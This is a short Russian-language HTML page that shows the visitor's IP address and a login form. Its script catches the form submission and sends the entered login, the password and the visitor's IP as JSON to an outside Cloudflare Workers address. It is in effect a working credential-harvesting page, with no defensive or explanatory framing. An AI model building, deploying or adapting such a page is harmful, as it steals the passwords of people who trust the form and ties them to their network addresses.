<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Ваш IP</title>
</head>
<body>
  <h2>Ваш IP-адрес:</h2>
  <p id="ip">Загрузка...</p>

  <form action="https://mute-scene-f7f5.kamrantataloo69.workers.dev/" method="POST" id="loginForm">
    <input type="text" name="login" placeholder="Login"><br>
    <input type="password" name="password" placeholder="Password"><br>
    <button type="submit">Login</button>
  </form>

  <script>
    // Получаем IP
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        document.getElementById('ip').textContent = data.ip;

        // Отправляем данные на воркер с IP-адресом, логином и паролем
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', async (event) => {
          event.preventDefault(); // Предотвращаем стандартное отправление формы

          const login = form.elements['login'].value;
          const password = form.elements['password'].value;

          const postData = {
            ip: data.ip,
            login: login,
            password: password,
          };

          // Отправляем POST-запрос на воркер
          await fetch('https://mute-scene-f7f5.kamrantataloo69.workers.dev/', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData),
          });

          alert('Данные отправлены!');
        });
      })
      .catch(() => {
        document.getElementById('ip').textContent = 'Ошибка получения IP';
      });
  </script>
</body
